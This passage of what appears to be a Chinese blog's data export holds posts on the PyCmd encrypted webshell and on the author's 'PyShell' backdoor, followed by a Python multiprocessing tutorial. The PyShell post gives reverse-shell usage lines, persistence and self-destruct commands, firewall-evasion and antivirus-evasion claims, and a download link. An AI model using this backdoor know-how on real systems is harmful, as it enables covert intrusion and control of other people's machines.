href=\"#PyCmd数据加密\" class=\"headerlink\" title=\"PyCmd数据加密\"></a>PyCmd数据加密</h4><p>PyCmd程序的长处在于它对往来的数据进行了加密，可以绕过防火墙对数据内容的校验。<br>当执行cmd命令时，通过Fiddler抓包查看数据：<br><img src=\"/upload_image/20160918/002.png\" alt=\"\"><br><img src=\"/upload_image/20160918/003.png\" alt=\"\"></p>\n<h4 id=\"PyCmd木马隐身\"><a href=\"#PyCmd木马隐身\" class=\"headerlink\" title=\"PyCmd木马隐身\"></a>PyCmd木马隐身</h4><p>用D盾扫描上传的木马服务端文件，显示为正常文件，成功躲过查杀<br><img src=\"/upload_image/20160918/001.png\" alt=\"\"></p>\n<h4 id=\"工具下载\"><a href=\"#工具下载\" class=\"headerlink\" title=\"工具下载\"></a>工具下载</h4><p>PyCmd  <a href=\"https://github.com/tengzhangchao/PyCmd\">下载地址</a></p>"},{"title":"PyShell 木马后门","date":"2016-09-04T16:00:00.000Z","comments":1,"_content":"\n　　在渗透测试过程中，经常会遇到一种状况：获取到了目标服务器的shell，需要进一步开展内网渗透，然而由于各种原因无法远程登录服务器，此时内网渗透往往很难开展。由此难点，我研发了一款具有针对性的后门程序，功能有点类似于NC(瑞士军刀)，但不局限于NC的功能，在此分享以表对NC的敬意。\n<!-- more -->\n### 使用方法\n```bash\n[HELP]  PyShell.exe [-listen(-slave)] [ip] [port]        #绿色免环境版\n[HELP]  python PyShell.py [-listen(-slave)] [ip] [port]  \n```\n### 功能参数\n```bash\n[HELP]  exit    ----退出连接\n[HELP]  kill    ----退出连接并自毁程序\n[HELP]  playtask    ----创建计划任务\n[HELP]  python -p file.py    ----在肉鸡上执行本地python脚本\n```\n\n### 实战演示\n\n#### 环境准备\n\n本机的IP地址为：10.0.3.119 \n本机上装了一个虚拟机，IP地址为：192.168.67.130 \n\n本机充当为目标服务器(被攻端),虚拟机充当为攻击机(攻击端)\n\n#### 运行木马\n\n首先在虚拟机上运行PyShell程序，监听一个未被使用的端口，如：2222\n\n接着在本机上运行PyShell程序，连接虚拟机的这个端口\n![](/upload_image/20160905_2/001.png)\n\n可以看到，虚拟机上反弹了一个shell\n![](/upload_image/20160905_2/002.png)\n\n在虚拟机shell中查询ip地址，是本机的10网段\n![](/upload_image/20160905_2/003.png)\n\n在虚拟机shell中执行命令，使本机执行python脚本，进行内网端口扫描\n![](/upload_image/20160905_2/004.png)\n\n>提示：python脚本并未传到本机，而是通过数据包形式传递到了PyShell文件内执行，数据流量经过16进制+Base64加密，可以绕过防火墙\n\n创建计划任务\n![](/upload_image/20160905_2/005.png)\n\n本机查看结果\n![](/upload_image/20160905_2/006.png)\n\n\n### 优缺点\n* 程序对互相传输的数据进行了加密，以绕过防火墙。\n\n* 当需要在肉鸡上执行python脚本时，不需要在肉鸡上上传相应的脚本文件，只需将本地脚本内容加密传输到肉鸡，并执行即可。\n\n* 此程序在执行完命令以后，并不能时时回显结果，也就是说python脚本运行完以后才会返回输出，有待完善。\n\n\n### 工具下载\n\nPyShell 木马后门  [下载地址](https://github.com/tengzhangchao/PyShell/)\n\n\n","source":"_posts/PyShell-木马后门.md","raw":"---\ntitle: PyShell 木马后门\ndate: 2016-09-05\ncomments: true\ntags: 木马后门\ncategories: 安全工具\n---\n\n　　在渗透测试过程中，经常会遇到一种状况：获取到了目标服务器的shell，需要进一步开展内网渗透，然而由于各种原因无法远程登录服务器，此时内网渗透往往很难开展。由此难点，我研发了一款具有针对性的后门程序，功能有点类似于NC(瑞士军刀)，但不局限于NC的功能，在此分享以表对NC的敬意。\n<!-- more -->\n### 使用方法\n```bash\n[HELP]  PyShell.exe [-listen(-slave)] [ip] [port]        #绿色免环境版\n[HELP]  python PyShell.py [-listen(-slave)] [ip] [port]  \n```\n### 功能参数\n```bash\n[HELP]  exit    ----退出连接\n[HELP]  kill    ----退出连接并自毁程序\n[HELP]  playtask    ----创建计划任务\n[HELP]  python -p file.py    ----在肉鸡上执行本地python脚本\n```\n\n### 实战演示\n\n#### 环境准备\n\n本机的IP地址为：10.0.3.119 \n本机上装了一个虚拟机，IP地址为：192.168.67.130 \n\n本机充当为目标服务器(被攻端),虚拟机充当为攻击机(攻击端)\n\n#### 运行木马\n\n首先在虚拟机上运行PyShell程序，监听一个未被使用的端口，如：2222\n\n接着在本机上运行PyShell程序，连接虚拟机的这个端口\n![](/upload_image/20160905_2/001.png)\n\n可以看到，虚拟机上反弹了一个shell\n![](/upload_image/20160905_2/002.png)\n\n在虚拟机shell中查询ip地址，是本机的10网段\n![](/upload_image/20160905_2/003.png)\n\n在虚拟机shell中执行命令，使本机执行python脚本，进行内网端口扫描\n![](/upload_image/20160905_2/004.png)\n\n>提示：python脚本并未传到本机，而是通过数据包形式传递到了PyShell文件内执行，数据流量经过16进制+Base64加密，可以绕过防火墙\n\n创建计划任务\n![](/upload_image/20160905_2/005.png)\n\n本机查看结果\n![](/upload_image/20160905_2/006.png)\n\n\n### 优缺点\n* 程序对互相传输的数据进行了加密，以绕过防火墙。\n\n* 当需要在肉鸡上执行python脚本时，不需要在肉鸡上上传相应的脚本文件，只需将本地脚本内容加密传输到肉鸡，并执行即可。\n\n* 此程序在执行完命令以后，并不能时时回显结果，也就是说python脚本运行完以后才会返回输出，有待完善。\n\n\n### 工具下载\n\nPyShell 木马后门  [下载地址](https://github.com/tengzhangchao/PyShell/)\n\n\n","slug":"PyShell-木马后门","published":1,"updated":"2017-02-14T01:12:03.337Z","layout":"post","photos":[],"link":"","_id":"ciz80dyaz000h3ofv9x2rn4y5","content":"<p>　　在渗透测试过程中，经常会遇到一种状况：获取到了目标服务器的shell，需要进一步开展内网渗透，然而由于各种原因无法远程登录服务器，此时内网渗透往往很难开展。由此难点，我研发了一款具有针对性的后门程序，功能有点类似于NC(瑞士军刀)，但不局限于NC的功能，在此分享以表对NC的敬意。<br><a id=\"more\"></a></p>\n<h3 id=\"使用方法\"><a href=\"#使用方法\" class=\"headerlink\" title=\"使用方法\"></a>使用方法</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">[HELP]  PyShell.exe [-listen(-slave)] [ip] [port]        <span class=\"comment\">#绿色免环境版</span></div><div class=\"line\">[HELP]  python PyShell.py [-listen(-slave)] [ip] [port]</div></pre></td></tr></table></figure>\n<h3 id=\"功能参数\"><a href=\"#功能参数\" class=\"headerlink\" title=\"功能参数\"></a>功能参数</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">[HELP]  <span class=\"built_in\">exit</span>    ----退出连接</div><div class=\"line\">[HELP]  <span class=\"built_in\">kill</span>    ----退出连接并自毁程序</div><div class=\"line\">[HELP]  playtask    ----创建计划任务</div><div class=\"line\">[HELP]  python -p file.py    ----在肉鸡上执行本地python脚本</div></pre></td></tr></table></figure>\n<h3 id=\"实战演示\"><a href=\"#实战演示\" class=\"headerlink\" title=\"实战演示\"></a>实战演示</h3><h4 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h4><p>本机的IP地址为：10.0.3.119<br>本机上装了一个虚拟机，IP地址为：192.168.67.130 </p>\n<p>本机充当为目标服务器(被攻端),虚拟机充当为攻击机(攻击端)</p>\n<h4 id=\"运行木马\"><a href=\"#运行木马\" class=\"headerlink\" title=\"运行木马\"></a>运行木马</h4><p>首先在虚拟机上运行PyShell程序，监听一个未被使用的端口，如：2222</p>\n<p>接着在本机上运行PyShell程序，连接虚拟机的这个端口<br><img src=\"/upload_image/20160905_2/001.png\" alt=\"\"></p>\n<p>可以看到，虚拟机上反弹了一个shell<br><img src=\"/upload_image/20160905_2/002.png\" alt=\"\"></p>\n<p>在虚拟机shell中查询ip地址，是本机的10网段<br><img src=\"/upload_image/20160905_2/003.png\" alt=\"\"></p>\n<p>在虚拟机shell中执行命令，使本机执行python脚本，进行内网端口扫描<br><img src=\"/upload_image/20160905_2/004.png\" alt=\"\"></p>\n<blockquote>\n<p>提示：python脚本并未传到本机，而是通过数据包形式传递到了PyShell文件内执行，数据流量经过16进制+Base64加密，可以绕过防火墙</p>\n</blockquote>\n<p>创建计划任务<br><img src=\"/upload_image/20160905_2/005.png\" alt=\"\"></p>\n<p>本机查看结果<br><img src=\"/upload_image/20160905_2/006.png\" alt=\"\"></p>\n<h3 id=\"优缺点\"><a href=\"#优缺点\" class=\"headerlink\" title=\"优缺点\"></a>优缺点</h3><ul>\n<li><p>程序对互相传输的数据进行了加密，以绕过防火墙。</p>\n</li>\n<li><p>当需要在肉鸡上执行python脚本时，不需要在肉鸡上上传相应的脚本文件，只需将本地脚本内容加密传输到肉鸡，并执行即可。</p>\n</li>\n<li><p>此程序在执行完命令以后，并不能时时回显结果，也就是说python脚本运行完以后才会返回输出，有待完善。</p>\n</li>\n</ul>\n<h3 id=\"工具下载\"><a href=\"#工具下载\" class=\"headerlink\" title=\"工具下载\"></a>工具下载</h3><p>PyShell 木马后门  <a href=\"https://github.com/tengzhangchao/PyShell/\" target=\"_blank\" rel=\"external\">下载地址</a></p>\n","excerpt":"<p>　　在渗透测试过程中，经常会遇到一种状况：获取到了目标服务器的shell，需要进一步开展内网渗透，然而由于各种原因无法远程登录服务器，此时内网渗透往往很难开展。由此难点，我研发了一款具有针对性的后门程序，功能有点类似于NC(瑞士军刀)，但不局限于NC的功能，在此分享以表对NC的敬意。<br>","more":"</p>\n<h3 id=\"使用方法\"><a href=\"#使用方法\" class=\"headerlink\" title=\"使用方法\"></a>使用方法</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">[HELP]  PyShell.exe [-listen(-slave)] [ip] [port]        <span class=\"comment\">#绿色免环境版</span></div><div class=\"line\">[HELP]  python PyShell.py [-listen(-slave)] [ip] [port]</div></pre></td></tr></table></figure>\n<h3 id=\"功能参数\"><a href=\"#功能参数\" class=\"headerlink\" title=\"功能参数\"></a>功能参数</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">[HELP]  <span class=\"built_in\">exit</span>    ----退出连接</div><div class=\"line\">[HELP]  <span class=\"built_in\">kill</span>    ----退出连接并自毁程序</div><div class=\"line\">[HELP]  playtask    ----创建计划任务</div><div class=\"line\">[HELP]  python -p file.py    ----在肉鸡上执行本地python脚本</div></pre></td></tr></table></figure>\n<h3 id=\"实战演示\"><a href=\"#实战演示\" class=\"headerlink\" title=\"实战演示\"></a>实战演示</h3><h4 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h4><p>本机的IP地址为：10.0.3.119<br>本机上装了一个虚拟机，IP地址为：192.168.67.130 </p>\n<p>本机充当为目标服务器(被攻端),虚拟机充当为攻击机(攻击端)</p>\n<h4 id=\"运行木马\"><a href=\"#运行木马\" class=\"headerlink\" title=\"运行木马\"></a>运行木马</h4><p>首先在虚拟机上运行PyShell程序，监听一个未被使用的端口，如：2222</p>\n<p>接着在本机上运行PyShell程序，连接虚拟机的这个端口<br><img src=\"/upload_image/20160905_2/001.png\" alt=\"\"></p>\n<p>可以看到，虚拟机上反弹了一个shell<br><img src=\"/upload_image/20160905_2/002.png\" alt=\"\"></p>\n<p>在虚拟机shell中查询ip地址，是本机的10网段<br><img src=\"/upload_image/20160905_2/003.png\" alt=\"\"></p>\n<p>在虚拟机shell中执行命令，使本机执行python脚本，进行内网端口扫描<br><img src=\"/upload_image/20160905_2/004.png\" alt=\"\"></p>\n<blockquote>\n<p>提示：python脚本并未传到本机，而是通过数据包形式传递到了PyShell文件内执行，数据流量经过16进制+Base64加密，可以绕过防火墙</p>\n</blockquote>\n<p>创建计划任务<br><img src=\"/upload_image/20160905_2/005.png\" alt=\"\"></p>\n<p>本机查看结果<br><img src=\"/upload_image/20160905_2/006.png\" alt=\"\"></p>\n<h3 id=\"优缺点\"><a href=\"#优缺点\" class=\"headerlink\" title=\"优缺点\"></a>优缺点</h3><ul>\n<li><p>程序对互相传输的数据进行了加密，以绕过防火墙。</p>\n</li>\n<li><p>当需要在肉鸡上执行python脚本时，不需要在肉鸡上上传相应的脚本文件，只需将本地脚本内容加密传输到肉鸡，并执行即可。</p>\n</li>\n<li><p>此程序在执行完命令以后，并不能时时回显结果，也就是说python脚本运行完以后才会返回输出，有待完善。</p>\n</li>\n</ul>\n<h3 id=\"工具下载\"><a href=\"#工具下载\" class=\"headerlink\" title=\"工具下载\"></a>工具下载</h3><p>PyShell 木马后门  <a href=\"https://github.com/tengzhangchao/PyShell/\">下载地址</a></p>"},{"title":"Python Multiprocessing","date":"2016-11-23T10:26:19.000Z","comments":1,"_content":"\n　　multiprocessing是Python的标准模块，它既可以用来编写多进程，也可以用来编写多线程。如果是多线程的话，用multiprocessing.dummy即可，用法与multiprocessing基本相同，这里主要介绍多进程的用法，欢迎纠错。\n\n#### （一）Multiprocessing介绍\n\n##### 为什么要使用python多进程？\n\n　　因为python使用全局解释器锁(GIL)，他会将进程中的线程序列化，也就是多核cpu实际上并不能达到并行提高速度的目的，而使用多进程则是不受限的，所以实际应用中都是推荐多进程的。\n　　如果每个子进程执行需要消耗的时间非常短（执行+1操作等），这不必使用多进程，因为进程的启动关闭也会耗费资源。\n　　当然使用多进程往往是用来处理CPU密集型（科学计算）的需求，如果是IO密集型（文件读取，爬虫等）则可以使用多线程去处理。\n\n##### multiprocessing常用组件及功能\n\n创建管理进程模块：\n* [Process](http://thief.one/2016/11/24/Multiprocessing-Process)（用于创建进程模块）\n* [Pool](http://thief.one/2016/11/24/Multiprocessing-Pool)（用于创建管理进程池）\n* Queue（用于进程通信，资源共享）\n* Value，Array（用于进程通信，资源共享）\n* Pipe（用于管道通信）\n* Manager（用于资源共享）\n\n同步子进程模块：\n* Condition\n* Event\n* Lock\n* RLock\n* Semaphore\n\n\n#### （二）Multiprocessing进程管理模块\n\n说明：由于篇幅有限，模块具体用法结束请参考每个模块的具体链接。\n\n##### Process模块\nProcess模块用来创建子进程，是Multiprocessing核心模块，使用方式与Threading类似，可以实现多进程的创建，启动，关闭等操作。\n具体介绍请参考：[Process模块介绍](http://thief.one/2016/11/24/Multiprocessing-Process)\n\n##### Pool模块\nPool模块是用来创建管理进程池的，当子进程非常多且需要控制子进程数量时可以使用此模块。\n具体介绍请参考：[Pool模块介绍](http://thief.one/2016/11/24/Multiprocessing-Pool)\n\n##### Queue模块\nQueue模块用来控制进程安全，与线程中的Queue用法一样。\n\n##### Pipe模块\nPipe模块用来管道操作。\n\n##### Manager模块\nManager模块常与Pool模块一起使用，作用是共享资源。\n\n#### （三）Multiprocessing同步进程模块\n\n##### Lock模块\n\n作用：当多个进程需要访问共享资源的时候，Lock可以用来避免访问的冲突。\n\n具体场景：所有的任务在打印的时候都会向同一个标准输出(stdout)输出。这样输出的字符会混合在一起，无法阅读。使用Lock同步，在一个任务输出完成之后，再允许另一个任务输出，可以避免多个任务同时向终端输出。\n\n代码实现：\n```bash\nfrom multiprocessing import Process, Lock  \n\ndef l(lock, num):  \n    lock.acquire()  \n    print \"Hello Num: %s\" % (num)  \n    lock.release()  \n\nif __name__ == '__main__':  \n    lock = Lock()  #这个一定要定义为全局\n    for num in range(20):  \n        Process(target=l, args=(lock, num)).start()  #这个类似多线程中的threading，但是进程太多了，控制不了。\n```\n\n##### Semaphore模块\n\n作用：用来控制对共享资源的访问数量，例如池的最大连接数。\n\n##### Event模块\n\n作用：用来实现进程间同步通信。\n\n#### （四）Multiprocessing.dummy多线程\n\nMultiprocessing.dummy用法与Multiprocessing用法基本相同，只不过是用来创建多线程。\n\n#### （五）使用Multiprocessing疑问\n\n* *启动多进程的代码一定要放在 *if __name__==\"__main__\":* 后面吗？*\n\n　　解答：windows系统下，想要启动一个子进程，必须加上*if __name__==\"__main__\":*，linux则不需要。\n\n* *父进程中的全局变量能被子进程共享吗？*\n\n　　解答：不行，因为每个进程享有独立的内存数据，如果想要共享资源，可以使用Manage类，或者Queue等模块。\n\n* *子进程能结束其他子进程或父进程吗？如果能，怎么通过子进程去结束所有进程?*\n\n　　解答：此需求可以稍作修改：所有的子进程都是为了完成一件事情，而当某个子进程完成该事情后，父进程就该结束所有子进程，请问该怎么做？此时结束所有子进程的操作可以交给父进程去做，因为子进程想要结束另外的子进程比较难实现。\n　　那么问题就又变成了父进程什么时候该结束所有进程？\n　　其中一个思路是*获取每个子进程的返回值*，一旦有返回True（结束的标记），则立马结束所有进程；\n　　另外一种思路是*使用共享资源*，父进程可以一直去判断这个公共资源，一旦子进程将它改变，则结束所有子进程。（推荐使用前者，因为多进程中不推荐使用资源共享）\n\n* *子进程中还能再创建子进程吗？*\n\n解答：可以，子进程可以再创建进程，线程中也可以创建进程。\n\n#### （六）多进程资源共享问题\n\n多进程中不推荐使用资源共享，如果非要使用，可以参考以下链接。\n\n具体介绍请参考：[多进程资源共享问题](http://thief.one/2016/11/24/Multiprocessing共享资源)\n\n#### （七）获取子进程返回值问题\n\n多进程中往往会碰到获取子进程返回值的问题，如果遇到问题可以参考以下链接。\n\n具体介绍请参考：[获取子进程返回值问题](http://thief.one/2016/11/24/Multiprocessing子进程返回值)\n\n<hr>\n\n参考网络文章：\n\n[http://www.cnblogs.com/vamei/archive/2012/10/12/2721484.html](http://www.cnblogs.com/vamei/archive/2012/10/12/2721484.html)\n[http://www.cnblogs.com/kaituorensheng/p/4465768.html](http://www.cnblogs.com/kaituorensheng/p/4465768.html)\n......\n太多了，列举不完，排名不分先后。","source":"_posts/Python-multiprocessing.md","raw":"---\ntitle: Python Multiprocessing\ndate: 2016-11-23 18:26:19\ncomments: true\ntags: Multiprocessing\ncategories: 编程之道\n---\n\n　　multiprocessing是Python的标准模块，它既可以用来编写多进程，也可以用来编写多线程。如果是多线程的话，用multiprocessing.dummy即可，用法与multiprocessing基本相同，这里主要介绍多进程的用法，欢迎纠错。\n\n#### （一）Multiprocessing介绍\n\n##### 为什么要使用python多进程？\n\n　　因为python使用全局解释器锁(GIL)，他会将进程中的线程序列化，也就是多核cpu实际上并不能达到并行提高速度的目的，而使用多进程则是不受限的，所以实际应用中都是推荐多进程的。\n　　如果每个子进程执行需要消耗的时间非常短（执行+1操作等），这不必使用多进程，因为进程的启动关闭也会耗费资源。\n　　当然使用多进程往往是用来处理CPU密集型（科学计算）的需求，如果是IO密集型（文件读取，爬虫等）则可以使用多线程去处理。\n\n##### multiprocessing常用组件及功能\n\n创建管理进程模块：\n* [Process](http://thief.one/2016/11/24/Multiprocessing-Process)（用于创建进程模块）\n* [Pool](http://thief.one/2016/11/24/Multiprocessing-Pool)（用于创建管理进程池）\n* Queue（用于进程通信，资源共享）\n* Value，Array（用于进程通信，资源共享）\n* Pipe（用于管道通信）\n* Manager（用于资源共享）\n\n同步子进程模块：\n* Condition\n* Event\n* Lock\n* RLock\n* Semaphore\n\n\n#### （二）Multiprocessing进程管理模块\n\n说明：由于篇幅有限，模块具体用法结束请参考每个模块的具体链接。\n\n##### Process模块\nProcess模块用来创建子进程，是Multiprocessing核心模块，使用方式与Threading类似，可以实现多进程的创建，启动，关闭等操作。\n具体介绍请参考：[Process模块介绍](http://thief.one/2016/11/24/Multiprocessing-Process)\n\n##### Pool模块\nPool模块是用来创建管理进程池的，当子进程非常多且需要控制子进程数量时可以使用此模块。\n具体介绍请参考：[Pool模块介绍](http://thief.one/2016/11/24/Multiprocessing-Pool)\n\n##### Queue模块\nQueue模块用来控制进程安全，与线程中的Queue用法一样。\n\n##### Pipe模块\nPipe模块用来管道操作。\n\n##### Manager模块\nManager模块常与Pool模块一起使用，作用是共享资源。\n\n#### （三）Multiprocessing同步进程模块\n\n##### Lock模块\n\n作用：当多个进程需要访问共享资源的时候，Lock可以用来避免访问的冲突。\n\n具体场景：所有的任务在打印的时候都会向同一个标准输出(stdout)输出。这样输出的字符会混合在一起，无法阅读。使用Lock同步，在一个任务输出完成之后，再允许另一个任务输出，可以避免多个任务同时向终端输出。\n\n代码实现：\n```bash\nfrom multiprocessing import Process, Lock  \n\ndef l(lock, num):  \n    lock.acquire()  \n    print \"Hello Num: %s\" % (num)  \n    lock.release()  \n\nif __name__ == '__main__':  \n    lock = Lock()  #这个一定要定义为全局\n    for num in range(20):  \n        Process(target=l, args=(lock, num)).start()  #这个类似多线程中的threading，但是进程太多了，控制不了。\n```\n\n##### Semaphore模块\n\n作用：用来控制对共享资源的访问数量，例如池的最大连接数。\n\n##### Event模块\n\n作用：用来实现进程间同步通信。\n\n#### （四）Multiprocessing.dummy多线程\n\nMultiprocessing.dummy用法与Multiprocessing用法基本相同，只不过是用来创建多线程。\n\n#### （五）使用Multiprocessing疑问\n\n* *启动多进程的代码一定要放在 *if __name__==\"__main__\":* 后面吗？*\n\n　　解答：windows系统下，想要启动一个子进程，必须加上*if __name__==\"__main__\":*，linux则不需要。\n\n* *父进程中的全局变量能被子进程共享吗？*\n\n　　解答：不行，因为每个进程享有独立的内存数据，如果想要共享资源，可以使用Manage类，或者Queue等模块。\n\n* *子进程能结束其他子进程或父进程吗？如果能，怎么通过子进程去结束所有进程?*\n\n　　解答：此需求可以稍作修改：所有的子进程都是为了完成一件事情，而当某个子进程完成该事情后，父进程就该结束所有子进程，请问该怎么做？此时结束所有子进程的操作可以交给父进程去做，因为子进程想要结束另外的子进程比较难实现。\n　　那么问题就又变成了父进程什么时候该结束所有进程？\n　　其中一个思路是*获取每个子进程的返回值*，一旦有返回True（结束的标记），则立马结束所有进程；\n　　另外一种思路是*使用共享资源*，父进程可以一直去判断这个公共资源，一旦子进程将它改变，则结束所有子进程。（推荐使用前者，因为多进程中不推荐使用资源共享）\n\n* *子进程中还能再创建子进程吗？*\n\n解答：可以，子进程可以再创建进程，线程中也可以创建进程。\n\n#### （六）多进程资源共享问题\n\n多进程中不推荐使用资源共享，如果非要使用，可以参考以下链接。\n\n具体介绍请参考：[多进程资源共享问题](http://thief.one/2016/11/24/Multiprocessing共享资源)\n\n#### （七）获取子进程返回值问题\n\n多进程中往往会碰到获取子进程返回值的问题，如果遇到问题可以参考以下链接。\n\n具体介绍请参考：[获取子进程返回值问题](http://thief.one/2016/11/24/Multiprocessing子进程返回值)\n\n<hr>\n\n参考网络文章：\n\n[http://www.cnblogs.com/vamei/archive/2012/10/12/2721484.html](http://www.cnblogs.com/vamei/archive/2012/10/12/2721484.html)\n[http://www.cnblogs.com/kaituorensheng/p/4465768.html](http://www.cnblogs.com/kaituorensheng/p/4465768.html)\n......\n太多了，列举不完，排名不分先后。","slug":"Python-multiprocessing","published":1,"updated":"2017-02-14T01:12:03.337Z","layout":"post","photos":[],"link":"","_id":"ciz80dyb2000k3ofvlden1s2o","content":"<p>　　multiprocessing是Python的标准模块，它既可以用来编写多进程，也可以用来编写多线程。如果是多线程的话，用multiprocessing.dummy即可，用法与multiprocessing基本相同，这里主要介绍多进程的用法，欢迎纠错。</p>\n<h4 id=\"（一）Multiprocessing介绍\"><a href=\"#（一）Multiprocessing介绍\" class=\"headerlink\" title=\"（一）Multiprocessing介绍\"></a>（一）Multiprocessing介绍</h4><h5 id=\"为什么要使用python多进程？\"><a href=\"#为什么要使用python多进程？\" class=\"headerlink\" title=\"为什么要使用python多进程？\"></a>为什么要使用python多进程？</h5><p>　　因为python使用全局解释器锁(GIL)，他会将进程中的线程序列化，也就是多核cpu实际上并不能达到并行提高速度的目的，而使用多进程则是不受限的，所以实际应用中都是推荐多进程的。<br>　　如果每个子进程执行需要消耗的时间非常短（执行+1操作等），这不必使用多进程，因为进程的启动关闭也会耗费资源。<br>　　当然使用多进程往往是用来处理CPU密集型（科学计算）的需求，如果是IO密集型（文件读取，爬虫等）则可以使用多线程去处理。</p>\n<h5 id=\"multiprocessing常用组件及功能\"><a href=\"#multiprocessing常用组件及功能\" class=\"headerlink\" title=\"multiprocessing常用组件及功能\"></a>multiprocessing常用组件及功能</h5><p>创建管理进程模块：</p>\n<ul>\n<li><a href=\"http://thief.one/2016/11/24/Multiprocessing-Process\">Process</a>（用于创建进程模块）</li>\n<li><a href=\"http://thief.one/2016/11/24/Multiprocessing-Pool\">Pool</a>（用于创建管理进程池）</li>\n<li>Queue（用于进程通信，资源共享）</li>\n<li>Value，Array（用于进程通信，资源共享）</li>\n<li>Pipe（用于管道通信）</li>\n<li>Manager（用于资源共享）</li>\n</ul>\n<p>同步子进程模块：</p>\n<ul>\n<li>Condition</li>\n<li>Event</li>\n<li>Lock</li>\n<li>RLock</li>\n<li>Semaphore</li>\n</ul>\n<h4 id=\"（二）Multiprocessing进程管理模块\"><a href=\"#（二）Multiprocessing进程管理模块\" class=\"headerlink\" title=\"（二）Multiprocessing进程管理模块\"></a>（二）Multiprocessing进程管理模块</h4><p>说明：由于篇幅有限，模块具体用法结束请参考每个模块的具体链接。</p>\n<h5 id=\"Process模块\"><a href=\"#Process模块\" class=\"headerlink\" title=\"Process模块\"></a>Process模块</h5><p>Process模块用来创建子进程，是Multiprocessing核心模块，使用方式与Threading类似，可以实现多进程的创建，启动，关闭等操作。<br>具体介绍请参考：<a href=\"http://thief.one/2016/11/24/Multiprocessing-Process\">Process模块介绍</a></p>\n<h5 id=\"Pool模块\"><a href=\"#Pool模块\" class=\"headerlink\" title=\"Pool模块\"></a>Pool模块</h5><p>Pool模块是用来创建管理进程池的，当子进程非常多且需要控制子进程数量时可以使用此模块。<br>具体介绍请参考：<a href=\"http://thief.one/2016/11/24/Multiprocessing-Pool\">Pool模块介绍</a></p>\n<h5 id=\"Queue模块\"><a href=\"#Queue模块\" class=\"headerlink\" title=\"Queue模块\"></a>Queue模块</h5><p>Queue模块用来控制进程安全，与线程中的Queue用法一样。</p>\n<h5 id=\"Pipe模块\"><a href=\"#Pipe模块\" class=\"headerlink\" title=\"Pipe模块\"></a>Pipe模块</h5><p>Pipe模块用来管道操作。</p>\n<h5 id=\"Manager模块\"><a href=\"#Manager模块\" class=\"headerlink\" title=\"Manager模块\"></a>Manager模块</h5><p>Manager模块常与Pool模块一起使用，作用是共享资源。</p>\n<h4 id=\"（三）Multiprocessing同步进程模块\"><a href=\"#（三）Multiprocessing同步进程模块\" class=\"headerlink\" title=\"（三）Multiprocessing同步进程模块\"></a>（三）Multiprocessing同步进程模块</h4><h5 id=\"Lock模块\"><a href=\"#Lock模块\" class=\"headerlink\" title=\"Lock模块\"></a>Lock模块</h5><p>作用：当多个进程需要访问共享资源的时候，Lock可以用来避免访问的冲突。</p>\n<p>具体场景：所有的任务在打印的时候都会向同一个标准输出(stdout)输出。这样输出的字符会混合在一起，无法阅读。使用Lock同步，在一个任务输出完成之后，再允许另一个任务输出，可以避免多个任务同时向终端输出。</p>\n<p>代码实现：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Process, Lock  </div><div class=\"line\"></div><div class=\"line\">def l(lock, num):  </div><div class=\"line\">    lock.acquire()  </div><div class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">\"Hello Num: %s\"</span> % (num)  </div><div class=\"line\">    lock.release()  </div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:  </div><div class=\"line\">    lock = Lock()  <span class=\"comment\">#这个一定要定义为全局</span></div><div class=\"line\">    <span class=\"keyword\">for</span> num <span class=\"keyword\">in</span> range(20):  </div><div class=\"line\">        Process(target=l, args=(lock, num)).start()  <span class=\"comment\">#这个类似多线程中的threading，但是进程太多了，控制不了。</span></div></pre></td></tr></table></figure></p>\n<h5 id=\"Semaphore模块\"><a href=\"#Semaphore模块\" class=\"headerlink\" title=\"Semaphore模块\"></a>Semaphore模块</h5><p>作用：用来控制对共享资源的访问数量，例如池的最大连接数。</p>\n<h5 id=\"Event模块\"><a href=\"#Event模块\" class=\"headerlink\" title=\"Event模块\"></a>Event模块</h5><p>作用：用来实现进程间同步通信。</p>\n<h4 id=\"（四）Multiprocessing-dummy多线程\"><a href=\"#（四）Multiprocessing-dummy多线程\" class=\"headerlink\" title=\"（四）Multiprocessing.dummy多线程\"></a>（四）Multiprocessing.dummy多线程</h4><p>Multiprocessing.dummy用法与Multiprocessing用法基本相同，只不过是用来创建多线程。</p>\n<h4 id=\"（五）使用Multiprocessing疑问\"><a href=\"#（五）使用Multiprocessing疑问\" class=\"headerlink\" title=\"（五）使用Multiprocessing疑问\"></a>（五）使用Multiprocessing疑问</h4><ul>\n<li><em>启动多进程的代码一定要放在 </em>if <strong>name</strong>==”<strong>main</strong>“:<em> 后面吗？</em></li>\n</ul>\n<p>　　解答：windows系统下，想要启动一个子进程，必须加上<em>if <strong>name</strong>==”<strong>main</strong>“:</em>，linux则不需要。</p>\n<ul>\n<li><em>父进程中的全局变量能被子进程共享吗？</em></li>\n</ul>\n<p>　　解答：不行，因为每个进程享有独立的内存数据，如果想要共享资源，可以使用Manage类，或者Queue等模块。</p>\n<ul>\n<li><em>子进程能结束其他子进程或父进程吗？如果能，怎么通过子进程去结束所有进程?</em></li>\n</ul>\n<p>　　